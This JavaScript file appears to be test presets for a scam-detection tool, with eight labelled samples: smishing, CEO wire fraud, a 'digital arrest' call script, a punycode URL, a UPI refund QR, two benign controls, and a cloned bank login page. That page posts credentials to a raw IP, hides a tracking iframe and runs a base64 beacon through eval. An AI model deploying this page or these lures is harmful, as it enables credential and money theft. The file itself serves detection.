/* ============================================================
   XEROX — presets-data.js
   8 real-world competition test cases across every channel.
   Each preset carries the FULL payload used by the engines —
   including a genuinely scannable QR bitmap (data URI).
   ============================================================ */
(function () {
  'use strict';

  const PRESETS = [
    /* ---------------------------------------------------------- 1 */
    {
      id: 'sms-kyc',
      label: 'Fake Bank KYC SMS',
      short: 'KYC suspension + OTP harvest',
      tag: 'SMS',
      mode: 'text',
      icon: 'message-square-warning',
      expected: 'FALSE',
      expectedTone: 'danger',
      note: 'A classic smishing lure: account-blocking threat, a freshly registered .top domain, and a request to hand over the OTP.',
      payload: {
        sender: 'AX-HDFCBK',
        subject: 'ALERT: KYC pending — account suspension',
        body: 'Dear Customer, your HDFC Bank account will be BLOCKED today because your KYC is incomplete. Update immediately to avoid permanent suspension: https://hdfc-kyc-verify.top/update?token=9f4c2 . Share the 6-digit OTP sent to your phone with our verification officer to complete re-activation. Do not ignore this message, penalties will apply.'
      }
    },

    /* ---------------------------------------------------------- 2 */
    {
      id: 'ceo-wire',
      label: 'AI-Generated CEO Wire',
      short: 'Zero-grammar BEC spear phishing',
      tag: 'EMAIL',
      mode: 'text',
      icon: 'briefcase',
      expected: 'FALSE',
      expectedTone: 'danger',
      note: 'Flawless grammar, executive authority, artificial deadline and a reply-to domain that does not match the claimed sender.',
      payload: {
        sender: 'Raghav Mehta <ceo-office@corp-board-portal.xyz>',
        subject: 'CONFIDENTIAL — Acquisition wire before 3:00 PM',
        body: 'Hi Priya,\n\nI need you to handle something strictly confidential before the board announcement. We are closing the Meridian acquisition this afternoon and the escrow wire must be initiated before 3:00 PM today. Please process a transfer of ₹48,50,000 to the beneficiary account I will share in my next note, and keep this thread off the finance group for now.\n\nReply directly to my alternate inbox at ceo-office@corp-board-portal.xyz — my corporate ID is having sync issues. This cannot wait for the usual approval chain; legal has already signed off. Confirm the moment the wire is queued.\n\nSent from my iPhone'
      }
    },

    /* ---------------------------------------------------------- 3 */
    {
      id: 'digital-arrest',
      label: 'Digital Arrest Call',
      short: 'CBI + AnyDesk + OTP coercion',
      tag: 'CALL',
      mode: 'call',
      icon: 'phone-call',
      expected: 'FALSE',
      expectedTone: 'danger',
      note: 'Law-enforcement impersonation, isolation instructions, remote-access installation and an OTP demand — five critical vishing signatures in one transcript.',
      payload: {
        transcript: 'Caller: Good afternoon, this is Inspector Sharma calling from the CBI Cyber Crime Cell, Mumbai. Your Aadhaar number was found linked to a FedEx parcel containing narcotics that was seized at customs this morning.\nYou: I have not sent any parcel.\nCaller: That is exactly what we are investigating. A case has been registered against you under the NDPS Act. Do not disconnect this call and do not tell your family or your bank, otherwise we will issue a non-bailable warrant.\nCaller: To verify your innocence you must join a Skype video call with the Supreme Court registrar within 10 minutes. First, install AnyDesk on your phone so our technical team can access your device and confirm nothing is hidden.\nCaller: For the verification deposit, transfer ₹1,95,000 to the government treasury account. Your account will be frozen in 10 minutes if you do not cooperate.\nCaller: Now read me the 6-digit OTP I just sent so I can confirm your identity. Do not delay.'
      }
    },

    /* ---------------------------------------------------------- 4 */
    {
      id: 'punycode-url',
      label: 'Punycode Lookalike URL',
      short: 'xn--pypal-4ve · Cyrillic homoglyph',
      tag: 'URL',
      mode: 'url',
      icon: 'link-2',
      expected: 'FALSE',
      expectedTone: 'danger',
      note: 'The label renders as "pаypal" with a Cyrillic "а". Human eyes see PayPal; the DNS does not.',
      payload: {
        url: 'https://xn--pypal-4ve.com/webapps/mpp/signin?cmd=_login-run&dispatch=5885d80'
      }
    },

    /* ---------------------------------------------------------- 5 */
    {
      id: 'upi-qr',
      label: 'UPI "Receive Money" QR',
      short: 'Real scannable QR → upi://pay',
      tag: 'QR',
      mode: 'qr',
      icon: 'qr-code',
      expected: 'FALSE',
      expectedTone: 'danger',
      note: 'Attached to a WhatsApp image claiming you will RECEIVE a refund. Scanning a UPI QR only ever sends money. This is a genuine decodable QR bitmap.',
      payload: {
        qrDataUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAAFKCAIAAAD0S4FSAAAISklEQVR42u3dQY7sNgwFwEzSQK6Q+5/uXyGLwDnALCIQfKTGqVpPu23ZDzLYGurreZ7fgDf63RCAeAPiDYg3IN6AeAPiDeINiDcg3oB4A+INiDeINyDegHgD4g10+tQ+9seffy2e9D9//2o5n9xxaiN2cpyTI98/Prnn57Yx3L0uszd4OQfEGxBvQLyBkk/XgWqVvRO5am2uFtpViT05TtfdqdX2a1eRO8OuT/3EZ97sDV7OAfEGxBsQb6DJJ3fo3Prt2refVH1rf5M7n9qI1SrVuVXWXSNWu/bJ1eO7z7zZG7ycA+INiDcg3kCTzzsuo7bC/KRi2VVL76rf7q4Mr+mq5OfOOVe7NnsD4g2INyDeIN7AD/SSynmtmr27Dny3P0mu5pwb1a4jv7VObvYGL+eAeAPiDYg30CRYOZ+sT052GtntqfJdrp9M7VOTK/kne8Xf9sybvcHLOSDegHgD4g3EtFXOc70+at9+f1fz795xPvf/Tdf47D7zZm/wcg6INyDegHgDMV/P8/xPLjXXIXxyjfeJ2/YwrY3z7qi+o6OL2Ru8nAPiDYg3IN5ASXHN+TvW6E6uYZ48n/vXQteuPfdduSc81+3H7A1ezgHxBsQbEG8gZrRby2TFsmZyv8uuVc2TNefct+fGsOuXhZMn4bZnw+wNXs4B8QbEGxBvoKStcp7rL33/Cupcj+7JvSwnf32YXNu/22W9q7ZvzTkg3iDegHgD4g0M+tx2Ql01wy67PTpOvqvrnHPXNVmlr31qdwfVrusye4OXc0C8AfEGxBtoMlo57+rafduOnCdyPWcmu9ns7pea21c0Nxpd42P2BsQbxBsQb0C8gUHBynlutW1XJ42TI3ddV+0qTj6Vqx5P7o46Oc6578p1fTF7A+IN4g2INyDewKCv53kKH5vsODHZM+S23Uhrx8md8zuu4ic+P/qcA+IN4g2INyDewKDgDqEnJivwtSPv7mG6u+9qrpdO7Thdz1hX16CuJ9zsDYg3IN4g3oB4A5dpq5zn9licrPHmupFM1tu7znny2ei6X7V6+1ufDbM3eDkHxBsQb0C8gZLlbi27nc9rJq+rdi9u20mza3wm+9vnvn3y2TB7g5dzQLwB8QbEGygpVs5PdFVrb+uFMtmXJlfxnrw7t/2GsnsVk/fd7A1ezgHxBsQbEG+gpNitZbfuurvCfHeNd9eRc1Xoriud3JFzsmvQ5Gp/szd4OQfEGxBvQLyBkmLl/B2Val3NZ+7FyZFv63ySW2Fu9gbEGxBvEG9AvIHrtfU5v23d9WTfldy1318Dr3177kq7RmN3nPU5B8QbxBsQb0C8gVXLlfP7e5jvdgi53+QvAvf/QpEbH33OAfEG8QbEGxBvYFBwh9AT9+9TObm/ZO18cmM4+RvB5H8N7D6Huaswe4OXc0C8AfEGxBto0rZD6InJiu7uiu6ub+86zm2/UHQ9Lbvd47uew9yomr3Byzkg3oB4A+INlHzuP8XJ1dpdZ9i1fvv+ju4nn+oasdz5TD6HXUc2e4OXc0C8AfEGxBuIaevWstvVvCZXhd7tNPITxyf3qZ84hl1Pi9kbvJwD4g2INyDeQEmwcl4z2bl6crV217XvVo9/4m8Nu/9ZMLkvrdkbvJwD4g2INyDeQJPRNecnnzqxW7+tHXn32u8fw9x35bq+dH1Kn3NAvAHxBvEGxBu4TLDPede62dyK3K66a+5Kc5+qHWdyt9bcGvjadeWeQ33OAfEGxBvEGxBv4DLFNee7vTUmVz6feEc/8Mle37Vzzq2uz3VZmbzvZm/wcg6INyDegHgDTdrWnE+uyK2tEM7ZrfbnVlnnKvBda9dz43Nbtd/sDYg3iDcg3oB4A4OC3Vrur8ROrkvvsrsTa65K3/VdtS4rud8Ruu6yNeeAeIN4A+INiDcwaLlby2Qv69oZnpxzVz+QyY7ut92d3F3uehJ2166bvQHxBvEGxBsQb2BQsXJ+YnelcVfVd3ftcW1Ud7uI3P+LwOTzvPtdZm/wcg6INyDegHgDJW1rzruqiLmq74ncVXR91+TulretA8/V27vOp+tTXU+L2Ru8nAPiDYg3IN5ASbHPeVcVsXbk2zqf1Eyez+Sq+Em37dHZ9YSbvQHxBvEGxBsQb2BVW7eW23p0dPWKmezWcn9f8dwY1r4rN4b3d48xe4OXc0C8AfEGxBuIGa2c145zYrfK2nU+XSZ7mOfuRe7XkMm7vPs7gtkbvJwD4g2INyDeQEmwcn7itop37Qwn1znfX+2/bf327vr2XArM3uDlHBBvQLwB8QZi2nYIPfGOPTG7VhrX7O7RmTufyf72t8l1jzF7g5dzQLwB8QbEGyhpW3O+K9fre7KPR9dxdtdm39atfbfLuj7ngHgD4g2IN4g38AN9ah/bXcd7Uo3cXeM9uSa/dj67/Ulqo/H92ycr1ffvb2v2Bi/ngHgD4g2IN9Dk03WgyYpl13G+n/NuP5DcWujc3bltNG7rA1+rgXfdL7M3eDkHxBsQb0C8gZJP7tC3rbueNNmNpGvku+7yZH+b3C6ruTGczIXZG7ycA+INiDcg3kDJ560XNtkT40Rut81cX5pcNTu3kn/yF4rbur6bvcHLOSDegHgD4g00eUnlPLfSuKvq21W3n+xPPtkdPdcvpWs0uo48+QuO2Ru8nAPiDYg3IN5ASbByvtt3ZXetb+6cayO/uy598shdK+d3+7fbIRQQbxBvQLwB8QZWtVXO7685T+5hursHZe4qdjvedF37yVXs/meBbi2AeIN4A+INiDew6ut5HqMAZm9AvAHxBsQbEG9AvEG8AfEGxBsQb0C8AfEG8QbEGxBvQLwB8Qb+y7+kG8xLlwiGCwAAAABJRU5ErkJggg==',
        qrPayload: 'upi://pay?pa=refund.help2024@okicici&pn=Refund%20Processing%20Cell&am=4999&cu=INR&tn=Scan%20to%20RECEIVE%20your%20pending%20refund',
        qrCaption: 'WhatsApp image · "Scan this QR to RECEIVE your ₹4,999 refund"'
      }
    },

    /* ---------------------------------------------------------- 6 */
    {
      id: 'dom-stealer',
      label: 'Obfuscated Login Stealer',
      short: 'Hidden iframe + eval(atob())',
      tag: 'HTML',
      mode: 'code',
      icon: 'code-2',
      expected: 'FALSE',
      expectedTone: 'danger',
      note: 'A cloned bank login page: password form posts to a raw IP, a zero-pixel iframe phones home, and the payload is base64-wrapped inside eval().',
      payload: {
        html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Secure Sign-In | NetBanking</title>
  <style>body{font-family:Arial,sans-serif;background:#0b1120;color:#eee}</style>
</head>
<body oncontextmenu="return false" onkeydown="if(event.keyCode===123){return false}">
  <h2>Internet Banking — Session Expired</h2>
  <p>Re-enter your credentials to continue your secure session.</p>

  <form method="POST" action="http://185.216.71.44/collect.php" id="loginform">
    <input type="text" name="cust_id" placeholder="Customer ID">
    <input type="password" name="password" placeholder="Password">
    <input type="password" name="pin" placeholder="Profile PIN">
    <button type="submit">Sign In</button>
  </form>

  <iframe src="http://tracker-panel.xyz/hit?campaign=bankclone"
     style="width:0;height:0;border:0;position:absolute;left:-9999px;" width="0" height="0"></iframe>

  <script>
    var _k = "ZG9jdW1lbnQud3JpdGUoJzxpZnJhbWUgc3JjPSJodHRwOi8vMTg1LjIxNi43MS40NC9iZWFjb24iIHdpZHRoPTAgc3R5bGU9ImRpc3BsYXk6bm9uZSI+PC9pZnJhbWU+Jyk7";
    eval(atob(_k));
    String.fromCharCode(104,116,116,112,58,47,47,49,56,53);
    setTimeout(function(){ document.write('<img src="http://185.216.71.44/pixel.gif" width="1" height="1">'); }, 50);
  </script>

  <script>
    document.addEventListener('keydown', function(e) {
      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
        alert('Inspect element is disabled for security reasons.');
      }
    });
  </script>
</body>
</html>`
      }
    },

    /* ---------------------------------------------------------- 7 */
    {
      id: 'otp-safe',
      label: 'Genuine Bank OTP Warning',
      short: 'Should score TRUE / SAFE',
      tag: 'SAFE',
      mode: 'text',
      icon: 'shield-check',
      expected: 'TRUE',
      expectedTone: 'safe',
      note: 'The false-positive test: a real bank OTP that explicitly warns you never to share it. A naive filter flags "OTP"; our anti-manipulation context rule clears it.',
      payload: {
        sender: 'AX-HDFCBK',
        subject: 'Your HDFC Bank OTP',
        body: 'Dear Customer, 482913 is your OTP for your HDFC Bank Net Banking login. This OTP is valid for 3 minutes. Never share your OTP, PIN or password with anyone — HDFC Bank will never ask you for it. If you did not initiate this request, call 1800 202 6161 immediately. Do not forward this message to anyone.'
      }
    },

    /* ---------------------------------------------------------- 8 */
    {
      id: 'work-email',
      label: 'Legitimate Work Email',
      short: 'GitHub PR link · TRUE / SAFE',
      tag: 'SAFE',
      mode: 'text',
      icon: 'git-pull-request',
      expected: 'TRUE',
      expectedTone: 'safe',
      note: 'Everyday developer mail with a busy deadline. Proves the NLP engine can read urgency without confusing it with coercion.',
      payload: {
        sender: 'Ananya Rao <ananya.rao@brightlabs.dev>',
        subject: 'Quick review before the 4 PM merge?',
        body: 'Hey Arjun, quick one — PR #42 is ready for review: https://github.com/brightlabs/repo/pull/42\n\nIt is mostly the billing webhook refactor plus a couple of tests. Could you take a look before the 4 PM merge window? No rush if you are in a meeting; I can push the merge to tomorrow morning.\n\nThanks!'
      }
    }
  ];

  window.XEROX_PRESETS = PRESETS;
  window.getXeroxPreset = function (id) {
    return PRESETS.find(p => p.id === id) || null;
  };
})();
